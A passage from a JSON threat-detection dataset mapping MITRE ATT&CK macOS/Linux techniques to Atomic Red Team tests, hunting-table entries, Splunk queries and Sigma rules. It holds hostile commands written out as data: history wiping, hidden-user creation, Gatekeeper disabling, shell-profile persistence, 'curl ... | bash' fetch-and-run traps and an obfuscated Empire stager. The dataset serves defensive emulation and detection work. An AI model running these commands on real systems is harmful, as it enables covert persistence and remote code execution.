"macos"], "executor": {"name": "sh", "command": "unset HISTFILE\nexport HISTFILESIZE=0\nhistory -c\n"}}]}}, {"Threat Hunting Tables": {"chain_id": "100191", "os": "mac", "parent_process": "bash", "commandline_string": "unset HISTFILE", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "low", "mitre_caption": "defense_evasion", "mitre_attack": "T1146", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100192", "os": "mac", "parent_process": "bash", "commandline_string": "export HISTFILESIZE=0", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "low", "mitre_caption": "defense_evasion", "mitre_attack": "T1146", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100193", "os": "mac", "parent_process": "bash", "commandline_string": "history -c", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "high", "mitre_caption": "defense_evasion", "mitre_attack": "T1146", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100194", "os": "mac", "parent_process": "bash", "commandline_string": "rm ~/.bash_history", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "high", "mitre_caption": "defense_evasion", "mitre_attack": "T1146", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100195", "os": "mac", "parent_process": "bash", "commandline_string": "cat /dev/null > ~/.bash_history", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "high", "mitre_caption": "defense_evasion", "mitre_attack": "T1146", "itw_sample": ""}}], "command_list": ["rm ~/.bash_history\n", "echo \"\" > ~/.bash_history\n", "cat /dev/null > ~/.bash_history\n", "ln -sf /dev/null ~/.bash_history\n", "truncate -s0 ~/.bash_history\n", "unset HISTFILE\nexport HISTFILESIZE=0\nhistory -c\n", "bash unset HISTFILE", "bash export HISTFILESIZE=0", "bash history -c", "bash rm ~/.bash_history", "bash cat /dev/null > ~/.bash_history", "```", "rm ~/.bash_history", "```", "```", "echo \" \" > .bash_history", "```", "```", "cat /dev/null > ~/.bash_history", "```", "```", "ln -sf /dev/null ~/.bash_history", "```", "```", "truncate -s0 ~/.bash_history", "```", "```", "unset HISTFILE", "```", "```", "export HISTFILESIZE=0", "```", "```", "history -c", "```"], "attack_paths": [], "queries": [{"product": "Azure Sentinel", "query": "Sysmon| where EventID == 1and (process_command_line contains \"*rm (Get-PSReadlineOption).HistorySavePath*\"or process_command_line contains \"*del (Get-PSReadlineOption).HistorySavePath*\"or process_command_line contains \"*Set-PSReadlineOption \u2013HistorySaveStyle SaveNothing*\"or process_command_line contains \"*Remove-Item (Get-PSReadlineOption).HistorySavePath*\")", "name": "Clear Command History"}, {"product": "Splunk", "query": "```", "name": null}, {"product": "Splunk", "query": "index=linux sourcetype=linux_audit syscall=263 | table time,host,auid,uid,euid,exe,key", "name": null}, {"product": "Splunk", "query": "index=linux sourcetype=linux_audit type=PATH name=.bash_history nametype=delete | table time,name,nametype", "name": null}, {"product": "Splunk", "query": "```", "name": null}, {"product": "Splunk", "query": "```", "name": null}, {"product": "Splunk", "query": "index=linux sourcetype=\"linux_audit\" bash_history_changes exe!=/home/ec2-user/splunk/bin/splunkd syscall=257 a2!=0 AND a3!=0 | table host,syscall,syscall_name,exe,auid", "name": null}, {"product": "Splunk", "query": "```", "name": null}, {"product": "Splunk", "query": "a2!=0 and a3!=0 are added in to the query to distinuish echo and cat - both logs Systemcall 257 (openat). Morover, when a user logsin through ssh - SYSCALL 257 is used with exe=/usr/bin/bash (2 events generated)for /home/$USER/.bash_history; however in that case the command arguments a2=0 and a3=0 ; when we use command \"echo \" \"> .bash_history\"  the same systemcall (257) and the same exe = /usr/bin/bash is used however command arguments a2!=0 and a3!=0.", "name": null}, {"product": "Splunk", "query": "index=linux sourcetype=\"linux_audit\" bash_history_changes exe!=/home/ec2-user/splunk/bin/splunkd syscall=257 exe=/usr/bin/bash a2!=0 AND a3!=0| table host,syscall,syscall_name,exe,auid", "name": null}, {"product": "Splunk", "query": "```", "name": null}, {"product": "Splunk", "query": "-a always,exit -F arch=b64 -F PATH=/home/ec2-user/.bash_history -S unlinkat -F auid>=1000 -F auid!=4294967295 -F key=delete_bash_history", "name": null}, {"product": "Splunk", "query": "-w /home/ec2-user/.bash_history -p rwa -k bash_history_changes", "name": null}, {"product": "Splunk", "query": "```", "name": null}, {"product": "Splunk", "query": "```", "name": null}, {"product": "Splunk", "query": "index=linux sourcetype=\"bash_history\"  \"rm * .bash_history\"", "name": null}, {"product": "Splunk", "query": "```", "name": null}], "possible_detections": [{"data_source": "auditlogs (audit.rules)"}, {"data_source": "bash_history logs"}, {"data_source": {"title": "Clear Command History", "id": "fdc88d25-96fb-4b7c-9633-c0e417fdbd4e", "status": "experimental", "description": "Clear command history in linux which is used for defense evasion.", "references": ["https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1146/T1146.yaml", "https://attack.mitre.org/techniques/T1146/", "https://www.hackers-arise.com/single-post/2016/06/20/Covering-your-BASH-Shell-Tracks-AntiForensics"], "author": "Patrick Bareiss", "date": "2019/03/24", "logsource": {"product": "linux"}, "detection": {"keywords": ["rm *bash_history", "echo \"\" > *bash_history", "cat /dev/null > *bash_history", "ln -sf /dev/null *bash_history", "truncate -s0 *bash_history", "export HISTFILESIZE=0", "history -c", "history -w", "shred *bash_history"], "condition": "keywords"}, "falsepositives": ["Unknown"], "level": "high", "tags": ["attack.defense_evasion", "attack.t1146"]}}]}, {"technique_id": "T1147", "commands": [{"source": "atomics/T1147/T1147.yaml", "command": "sudo dscl . -create /Users/APT UniqueID 333\n", "name": null}, {"source": "Threat Hunting Tables", "command": "bash sudo xattr -r -d com.apple.quarantine /path/to/*.app", "name": null}], "parsed_datasets": [{"Atomic Red Team Test - Hidden Users": {"attack_technique": "T1147", "display_name": "Hidden Users", "atomic_tests": [{"name": "Hidden Users", "description": "Add a hidden user on MacOS\n", "supported_platforms": ["macos"], "input_arguments": {"user_name": {"description": "username to add", "type": "string", "default": "APT"}}, "executor": {"name": "sh", "command": "sudo dscl . -create /Users/#{user_name} UniqueID 333\n"}}]}}, {"Threat Hunting Tables": {"chain_id": "100196", "os": "mac", "parent_process": "bash", "commandline_string": "sudo xattr -r -d com.apple.quarantine /path/to/*.app", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "high", "mitre_caption": "defense_evasion", "mitre_attack": "T1147", "itw_sample": ""}}], "command_list": ["sudo dscl . -create /Users/APT UniqueID 333\n", "bash sudo xattr -r -d com.apple.quarantine /path/to/*.app"], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "T1148", "commands": [{"source": "atomics/T1148/T1148.yaml", "command": "export HISTCONTROL=ignoreboth\nls whoami\n", "name": null}, {"source": "Threat Hunting Tables", "command": "bash sudo spctl --master-disable", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "```", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "export HISTCONTROL=ignoreboth", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "```", "name": null}], "parsed_datasets": [{"Atomic Red Team Test - HISTCONTROL": {"attack_technique": "T1148", "display_name": "HISTCONTROL", "atomic_tests": [{"name": "Disable history collection", "description": "Disables history collection in shells\n", "supported_platforms": ["linux", "macos"], "input_arguments": {"evil_command": {"description": "Command to run after shell history collection is disabled", "type": "String", "default": "whoami"}}, "executor": {"name": "sh", "command": "export HISTCONTROL=ignoreboth\nls #{evil_command}\n"}}, {"name": "Mac HISTCONTROL", "description": "", "supported_platforms": ["macos", "linux"], "executor": {"name": "manual", "steps": "1. export HISTCONTROL=ignoreboth\n2. echo export \"HISTCONTROL=ignoreboth\" >> ~/.bash_profile\n3. ls\n4. whoami > recon.txt\n"}}]}}, {"Threat Hunting Tables": {"chain_id": "100197", "os": "mac", "parent_process": "bash", "commandline_string": "sudo spctl --master-disable", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "high", "mitre_caption": "defense_evasion", "mitre_attack": "T1148", "itw_sample": ""}}], "command_list": ["export HISTCONTROL=ignoreboth\nls whoami\n", "bash sudo spctl --master-disable", "```", "export HISTCONTROL=ignoreboth", "```"], "attack_paths": [], "queries": [{"product": "Splunk", "query": "```", "name": null}, {"product": "Splunk", "query": "index=linux sourcetype=\"bash_history\" export HISTCONTROL | table host, user_name, bash_command", "name": null}, {"product": "Splunk", "query": "```", "name": null}], "possible_detections": [{"data_source": "bash_history logs"}]}, {"technique_id": "T1150", "commands": [], "parsed_datasets": [{"Atomic Red Team Test - Plist Modification": {"attack_technique": "T1150", "display_name": "Plist Modification", "atomic_tests": [{"name": "Plist Modification", "description": "Modify MacOS plist file in one of two directories\n", "supported_platforms": ["macos"], "executor": {"name": "manual", "steps": "1. Modify a .plist in\n\n    /Library/Preferences\n\n    OR\n\n    ~/Library/Preferences\n\n2. Subsequently, follow the steps for adding and running via [Launch Agent](Persistence/Launch_Agent.md)\n"}}]}}], "command_list": [], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "T1151", "commands": [], "parsed_datasets": [{"Atomic Red Team Test - Space After Filename": {"attack_technique": "T1151", "display_name": "Space After Filename", "atomic_tests": [{"name": "Space After Filename", "description": "Space After Filename\n", "supported_platforms": ["macos"], "executor": {"name": "manual", "steps": "1. echo '#!/bin/bash\\necho \"print \\\"hello, world!\\\"\" | /usr/bin/python\\nexit' > execute.txt && chmod +x execute.txt\n\n2. mv execute.txt \"execute.txt \"\n\n3. ./execute.txt\\ \n"}}]}}], "command_list": [], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "T1152", "commands": [{"source": "atomics/T1152/T1152.yaml", "command": "launchctl submit -l evil -- /Applications/Calculator.app/Contents/MacOS/Calculator\n", "name": null}], "parsed_datasets": [{"Atomic Red Team Test - Launchctl": {"attack_technique": "T1152", "display_name": "Launchctl", "atomic_tests": [{"name": "Launchctl", "description": "Utilize launchctl\n", "supported_platforms": ["macos"], "executor": {"name": "sh", "command": "launchctl submit -l evil -- /Applications/Calculator.app/Contents/MacOS/Calculator\n"}}]}}], "command_list": ["launchctl submit -l evil -- /Applications/Calculator.app/Contents/MacOS/Calculator\n"], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "T1153", "commands": [{"source": "atomics/T1153/T1153.yaml", "command": "sh -c \"echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh\"\nchmod +x /tmp/art.sh\nsource /tmp/art.sh\n", "name": null}, {"source": "atomics/T1153/T1153.yaml", "command": "sh -c \"echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh\"\nchmod +x /tmp/art.sh\n. /tmp/art.sh\n", "name": null}], "parsed_datasets": [{"Atomic Red Team Test - Source": {"attack_technique": "T1153", "display_name": "Source", "atomic_tests": [{"name": "Execute Script using Source", "description": "Creates a script and executes it using the source command\n", "supported_platforms": ["macos", "linux"], "executor": {"name": "sh", "command": "sh -c \"echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh\"\nchmod +x /tmp/art.sh\nsource /tmp/art.sh\n"}}, {"name": "Execute Script using Source Alias", "description": "Creates a script and executes it using the source command's dot alias\n", "supported_platforms": ["macos", "linux"], "executor": {"name": "sh", "command": "sh -c \"echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh\"\nchmod +x /tmp/art.sh\n. /tmp/art.sh\n"}}]}}], "command_list": ["sh -c \"echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh\"\nchmod +x /tmp/art.sh\nsource /tmp/art.sh\n", "sh -c \"echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh\"\nchmod +x /tmp/art.sh\n. /tmp/art.sh\n"], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "T1154", "commands": [{"source": "atomics/T1154/T1154.yaml", "command": "trap \"nohup sh $PathToAtomicsFolder/T1154/src/echo-art-fish.sh | bash\" EXIT\nexit\ntrap \"nohup sh $PathToAtomicsFolder/T1154/src/echo-art-fish.sh | bash\" SIGINt\n", "name": null}, {"source": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "command": "Bash\nicbc @ icbc: / $ trap 'nohup curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1154/echo-art-fish.sh\n\n> ^ C", "name": "Bash"}, {"source": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "command": "Bash\nicbc @ icbc: / $ history\n\n693 trap 'nohup curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1154/echo-art-fish.sh", "name": "Bash"}, {"source": "Kirtar22/Litmus_Test", "command": "trap 'nohup curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1154/echo-art-fish.sh | bash' EXIT", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "nohup is used for continuing program/script execution even after exit.", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "trap 'nohup curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1154/echo-art-fish.sh | bash' INT", "name": null}], "parsed_datasets": [{"Atomic Red Team Test - Trap": {"attack_technique": "T1154", "display_name": "Trap", "atomic_tests": [{"name": "Trap", "description": "After exiting the shell, the script will download and execute.\n\nAfter sending a keyboard interrupt (CTRL+C) the script will download and execute.\n", "supported_platforms": ["macos", "linux"], "executor": {"name": "sh", "command": "trap \"nohup sh $PathToAtomicsFolder/T1154/src/echo-art-fish.sh | bash\" EXIT\nexit\ntrap \"nohup sh $PathToAtomicsFolder/T1154/src/echo-art-fish.sh | bash\" SIGINt\n"}}]}}], "command_list": ["trap \"nohup sh $PathToAtomicsFolder/T1154/src/echo-art-fish.sh | bash\" EXIT\nexit\ntrap \"nohup sh $PathToAtomicsFolder/T1154/src/echo-art-fish.sh | bash\" SIGINt\n", "Bash\nicbc @ icbc: / $ trap 'nohup curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1154/echo-art-fish.sh\n\n> ^ C", "Bash\nicbc @ icbc: / $ history\n\n693 trap 'nohup curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1154/echo-art-fish.sh", "trap 'nohup curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1154/echo-art-fish.sh | bash' EXIT", "nohup is used for continuing program/script execution even after exit.", "trap 'nohup curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1154/echo-art-fish.sh | bash' INT"], "attack_paths": [], "queries": [{"product": "Splunk", "query": "index=linux sourcetype=bash_history \"trap *\" | table host,user_name,bash_command", "name": null}], "possible_detections": [{"data_source": "bash_history logs"}]}, {"technique_id": "T1155", "commands": [{"source": "atomics/T1155/T1155.yaml", "command": "osascript -e \\\"do shell script \\\\\\\"echo \\\\\\\\\\\\\\\"import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('aW1wb3J0IHN5cztpbXBvcnQgcmUsIHN1YnByb2Nlc3M7Y21kID0gInBzIC1lZiB8IGdyZXAgTGl0dGxlXCBTbml0Y2ggfCBncmVwIC12IGdyZXAiCnBzID0gc3VicHJvY2Vzcy5Qb3BlbihjbWQsIHNoZWxsPVRydWUsIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUpCm91dCA9IHBzLnN0ZG91dC5yZWFkKCkKcHMuc3Rkb3V0LmNsb3NlKCkKaWYgcmUuc2VhcmNoKCJMaXR0bGUgU25pdGNoIiwgb3V0KToKICAgc3lzLmV4aXQoKQppbXBvcnQgdXJsbGliMjsKVUE9J01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2tvJztzZXJ2ZXI9J2h0dHA6Ly8xMjcuMC4wLjE6ODAnO3Q9Jy9sb2dpbi9wcm9jZXNzLnBocCc7cmVxPXVybGxpYjIuUmVxdWVzdChzZXJ2ZXIrdCk7CnJlcS5hZGRfaGVhZGVyKCdVc2VyLUFnZW50JyxVQSk7CnJlcS5hZGRfaGVhZGVyKCdDb29raWUnLCJzZXNzaW9uPXQzVmhWT3MvRHlDY0RURnpJS2FuUnhrdmszST0iKTsKcHJveHkgPSB1cmxsaWIyLlByb3h5SGFuZGxlcigpOwpvID0gdXJsbGliMi5idWlsZF9vcGVuZXIocHJveHkpOwp1cmxsaWIyLmluc3RhbGxfb3BlbmVyKG8pOwphPXVybGxpYjIudXJsb3BlbihyZXEpLnJlYWQoKTsKSVY9YVswOjRdO2RhdGE9YVs0Ol07a2V5PUlWKyc4Yzk0OThmYjg1YmQ1MTE5ZGQ5ODQ4MTJlZTVlOTg5OSc7UyxqLG91dD1yYW5nZSgyNTYpLDAsW10KZm9yIGkgaW4gcmFuZ2UoMjU2KToKICAgIGo9KGorU1tpXStvcmQoa2V5W2klbGVuKGtleSldKSklMjU2CiAgICBTW2ldLFNbal09U1tqXSxTW2ldCmk9aj0wCmZvciBjaGFyIGluIGRhdGE6CiAgICBpPShpKzEpJTI1NgogICAgaj0oaitTW2ldKSUyNTYKICAgIFNbaV0sU1tqXT1TW2pdLFNbaV0KICAgIG91dC5hcHBlbmQoY2hyKG9yZChjaGFyKV5TWyhTW2ldK1Nbal0pJTI1Nl0pKQpleGVjKCcnLmpvaW4ob3V0KSkK'));\\\\\\\\\\\\\\\" | python &\\\\\\\"\\\"\n", "name": null}, {"source": "data/abilities/execution/de52784d-4de6-4d4e-b79e-e7b68fe037fb.yml", "command": {"darwin": {"sh": {"command": "osascript bookmark.scpt #{host.chrome.bookmark_title[filters(max=1)]} #{server.malicious.url[filters(max=1)]}\n", "payloads": ["bookmark.scpt"]}}}, "name": "Add a malicous bookmark which looks like a current one"}, {"source": "Threat Hunting Tables", "command": "osascript do shell script echo \\\"import ", "name": null}, {"source": "Threat Hunting Tables", "command": "osascript -e 'tell app \"System Preferences\" to activate'", "name": null}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/persistence/osx/mail", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/persistence/osx/mail", "name": "Empire Module Command"}], "parsed_datasets": [{"Atomic Red Team Test - AppleScript": {"attack_technique": "T1155", "display_name": "AppleScript", "atomic_tests": [{"name": "AppleScript", "description": "Shell Script with AppleScript. The encoded python script will perform an HTTP GET request to 127.0.0.1:80 with a session cookie of \"t3VhVOs/DyCcDTFzIKanRxkvk3I=\", unless 'Little Snitch' is installed, in which case it will just exit. \nYou can use netcat to listen for the connection and verify execution, e.g. use \"nc -l 80\" in another terminal window before executing this test and watch for the request.\n\nNote: If you want to run this command manually on the command line use 'sh -c \"<command>\"'\nReference: https://github.com/EmpireProject/Empire\n", "supported_platforms": ["macos"], "executor": {"name": "sh", "command": "osascript -e \\\"do shell script \\\\\\\"echo \\\\\\\\\\\\\\\"import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('aW1wb3J0IHN5cztpbXBvcnQgcmUsIHN1YnByb2Nlc3M7Y21kID0gInBzIC1lZiB8IGdyZXAgTGl0dGxlXCBTbml0Y2ggfCBncmVwIC12IGdyZXAiCnBzID0gc3VicHJvY2Vzcy5Qb3BlbihjbWQsIHNoZWxsPVRydWUsIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUpCm91dCA9IHBzLnN0ZG91dC5yZWFkKCkKcHMuc3Rkb3V0LmNsb3NlKCkKaWYgcmUuc2VhcmNoKCJMaXR0bGUgU25pdGNoIiwgb3V0KToKICAgc3lzLmV4aXQoKQppbXBvcnQgdXJsbGliMjsKVUE9J01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2tvJztzZXJ2ZXI9J2h0dHA6Ly8xMjcuMC4wLjE6ODAnO3Q9Jy9sb2dpbi9wcm9jZXNzLnBocCc7cmVxPXVybGxpYjIuUmVxdWVzdChzZXJ2ZXIrdCk7CnJlcS5hZGRfaGVhZGVyKCdVc2VyLUFnZW50JyxVQSk7CnJlcS5hZGRfaGVhZGVyKCdDb29raWUnLCJzZXNzaW9uPXQzVmhWT3MvRHlDY0RURnpJS2FuUnhrdmszST0iKTsKcHJveHkgPSB1cmxsaWIyLlByb3h5SGFuZGxlcigpOwpvID0gdXJsbGliMi5idWlsZF9vcGVuZXIocHJveHkpOwp1cmxsaWIyLmluc3RhbGxfb3BlbmVyKG8pOwphPXVybGxpYjIudXJsb3BlbihyZXEpLnJlYWQoKTsKSVY9YVswOjRdO2RhdGE9YVs0Ol07a2V5PUlWKyc4Yzk0OThmYjg1YmQ1MTE5ZGQ5ODQ4MTJlZTVlOTg5OSc7UyxqLG91dD1yYW5nZSgyNTYpLDAsW10KZm9yIGkgaW4gcmFuZ2UoMjU2KToKICAgIGo9KGorU1tpXStvcmQoa2V5W2klbGVuKGtleSldKSklMjU2CiAgICBTW2ldLFNbal09U1tqXSxTW2ldCmk9aj0wCmZvciBjaGFyIGluIGRhdGE6CiAgICBpPShpKzEpJTI1NgogICAgaj0oaitTW2ldKSUyNTYKICAgIFNbaV0sU1tqXT1TW2pdLFNbaV0KICAgIG91dC5hcHBlbmQoY2hyKG9yZChjaGFyKV5TWyhTW2ldK1Nbal0pJTI1Nl0pKQpleGVjKCcnLmpvaW4ob3V0KSkK'));\\\\\\\\\\\\\\\" | python &\\\\\\\"\\\"\n"}}]}}, {"Mitre Stockpile - Add a malicous bookmark which looks like a current one": {"id": "de52784d-4de6-4d4e-b79e-e7b68fe037fb", "name": "Add bookmark", "description": "Add a malicous bookmark which looks like a current one", "tactic": "execution", "technique": {"attack_id": "T1155", "name": "AppleScript"}, "platforms": {"darwin": {"sh": {"command": "osascript bookmark.scpt #{host.chrome.bookmark_title[filters(max=1)]} #{server.malicious.url[filters(max=1)]}\n", "payloads": ["bookmark.scpt"]}}}}}, {"Threat Hunting Tables": {"chain_id": "100198", "os": "mac", "parent_process": "osascript", "commandline_string": "do shell script echo \\\"import ", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "high", "mitre_caption": "applescript", "mitre_attack": "T1155", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100199", "os": "mac", "parent_process": "osascript", "commandline_string": "-e 'tell app \"System Preferences\" to activate'", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "high", "mitre_caption": "applescript", "mitre_attack": "T1155", "itw_sample": ""}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "python/persistence/osx/mail", "ATT&CK Technique #1": "T1155", "ATT&CK Technique #2": "T1108", "Technique": "AppleScript", "Concatenate for Python Dictionary": "\"python/persistence/osx/mail\":  [\"T1155\",\"T1108\"],"}}], "command_list": ["osascript -e \\\"do shell script \\\\\\\"echo \\\\\\\\\\\\\\\"import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('aW1wb3J0IHN5cztpbXBvcnQgcmUsIHN1YnByb2Nlc3M7Y21kID0gInBzIC1lZiB8IGdyZXAgTGl0dGxlXCBTbml0Y2ggfCBncmVwIC12IGdyZXAiCnBzID0gc3VicHJvY2Vzcy5Qb3BlbihjbWQsIHNoZWxsPVRydWUsIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUpCm91dCA9IHBzLnN0ZG91dC5yZWFkKCkKcHMuc3Rkb3V0LmNsb3NlKCkKaWYgcmUuc2VhcmNoKCJMaXR0bGUgU25pdGNoIiwgb3V0KToKICAgc3lzLmV4aXQoKQppbXBvcnQgdXJsbGliMjsKVUE9J01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2tvJztzZXJ2ZXI9J2h0dHA6Ly8xMjcuMC4wLjE6ODAnO3Q9Jy9sb2dpbi9wcm9jZXNzLnBocCc7cmVxPXVybGxpYjIuUmVxdWVzdChzZXJ2ZXIrdCk7CnJlcS5hZGRfaGVhZGVyKCdVc2VyLUFnZW50JyxVQSk7CnJlcS5hZGRfaGVhZGVyKCdDb29raWUnLCJzZXNzaW9uPXQzVmhWT3MvRHlDY0RURnpJS2FuUnhrdmszST0iKTsKcHJveHkgPSB1cmxsaWIyLlByb3h5SGFuZGxlcigpOwpvID0gdXJsbGliMi5idWlsZF9vcGVuZXIocHJveHkpOwp1cmxsaWIyLmluc3RhbGxfb3BlbmVyKG8pOwphPXVybGxpYjIudXJsb3BlbihyZXEpLnJlYWQoKTsKSVY9YVswOjRdO2RhdGE9YVs0Ol07a2V5PUlWKyc4Yzk0OThmYjg1YmQ1MTE5ZGQ5ODQ4MTJlZTVlOTg5OSc7UyxqLG91dD1yYW5nZSgyNTYpLDAsW10KZm9yIGkgaW4gcmFuZ2UoMjU2KToKICAgIGo9KGorU1tpXStvcmQoa2V5W2klbGVuKGtleSldKSklMjU2CiAgICBTW2ldLFNbal09U1tqXSxTW2ldCmk9aj0wCmZvciBjaGFyIGluIGRhdGE6CiAgICBpPShpKzEpJTI1NgogICAgaj0oaitTW2ldKSUyNTYKICAgIFNbaV0sU1tqXT1TW2pdLFNbaV0KICAgIG91dC5hcHBlbmQoY2hyKG9yZChjaGFyKV5TWyhTW2ldK1Nbal0pJTI1Nl0pKQpleGVjKCcnLmpvaW4ob3V0KSkK'));\\\\\\\\\\\\\\\" | python &\\\\\\\"\\\"\n", {"darwin": {"sh": {"command": "osascript bookmark.scpt #{host.chrome.bookmark_title[filters(max=1)]} #{server.malicious.url[filters(max=1)]}\n", "payloads": ["bookmark.scpt"]}}}, "osascript do shell script echo \\\"import ", "osascript -e 'tell app \"System Preferences\" to activate'", "python/persistence/osx/mail", "python/persistence/osx/mail"], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "T1156", "commands": [{"source": "atomics/T1156/T1156.yaml", "command": "echo \"/path/to/script.py\" >> ~/.bash_profile\n", "name": null}, {"source": "atomics/T1156/T1156.yaml", "command": "echo \"/path/to/script.py\" >> ~/.bashrc\n", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "echo \"#{command_to_add}\" >> ~/.bashrc", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "echo \"#{command_to_add}\" >> ~/.bash_profile", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "echo \"/home/ec2-user/welcome.sh\" >>~/.bash_profile", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "echo \"/home/ec2-user/welcome.sh\" >>~/.bashrc", "name": null}], "parsed_datasets": [{"Atomic Red Team Test - .bash_profile and .bashrc": {"attack_technique": "T1156", "display_name": ".bash_profile and .bashrc", "atomic_tests": [{"name": "Add command to .bash_profile", "description": "Adds a command to the .bash_profile file of the current user\n", "supported_platforms": ["macos", "linux"], "input_arguments": {"command_to_add": {"description": "Command to add to the .bash_profile file", "type": "string", "default": "/path/to/script.py"}}, "executor": {"name": "sh", "command": "echo \"#{command_to_add}\" >> ~/.bash_profile\n"}}, {"name": "Add command to .bashrc", "description": "Adds a command to the .bashrc file of the current user\n", "supported_platforms": ["macos", "linux"], "input_arguments": {"command_to_add": {"description": "Command to add to the .bashrc file", "type": "string", "default": "/path/to/script.py"}}, "executor": {"name": "sh", "command": "echo \"#{command_to_add}\" >> ~/.bashrc\n"}}]}}], "command_list": ["echo \"/path/to/script.py\" >> ~/.bash_profile\n", "echo \"/path/to/script.py\" >> ~/.bashrc\n", "echo \"#{command_to_add}\" >> ~/.bashrc", "echo \"#{command_to_add}\" >> ~/.bash_profile", "echo \"/home/ec2-user/welcome.sh\" >>~/.bash_profile", "echo \"/home/ec2-user/welcome.sh\" >>~/.bashrc"], "attack_paths": [], "queries": [{"product": "Splunk", "query": "index=linux sourcetype=linux_audit bashrc_changes", "name": null}, {"product": "Splunk", "query": "-w /home/ec2-user/.bashrc -p wa -k bashrc_changes", "name": null}, {"product": "Splunk", "query": "-w /home/ec2-user/.bash_profile -p wa -k bashrc_changes", "name": null}, {"product": "Splunk", "query": "index=linux sourcetype=bash_history bash_command=\"nano .bashrc\" OR bash_command=\"vi .bashrc\" OR echo .bashrc | table host,user_name,bash_command", "name": null}, {"product": "Splunk", "query": "index=linux sourcetype=bash_history bash_command=\"nano .bashrc_profile\" OR bash_command=\"vi .bashrc_profile\" OR echo .bashrc_profile | table host,user_name,bash_command", "name": null}], "possible_detections": [{"data_source": "auditlogs (audit.rules)"}, {"data_source": "bash_history logs"}, {"data_source": {"title": "Detects Suspicious edit of .bash_profile and .bashrc on Linux systems", "id": "e74e15cc-c4b6-4c80-b7eb-dfe49feb7fe9", "status": "experimental", "description": "Detects change of user environment. Adversaries can insert code into these files to gain persistence each time a user logs in or opens a new shell.", "references": ["MITRE Attack technique T1156; .bash_profile and .bashrc. "], "date": "2019/05/12", "tags": ["attack.s0003", "attack.t1156", "attack.persistence"], "author": "Peter Matkovski", "logsource": {"product": "linux", "service": "auditd"}, "detection": {"selection": {"type": "PATH", "name": ["/home/*/.bashrc", "/home/*/.bash_profile", "/home/*/.profile", "/etc/profile", "/etc/shells", "/etc/bashrc", "/etc/csh.cshrc", "/etc/csh.login"]}, "condition": "selection"}, 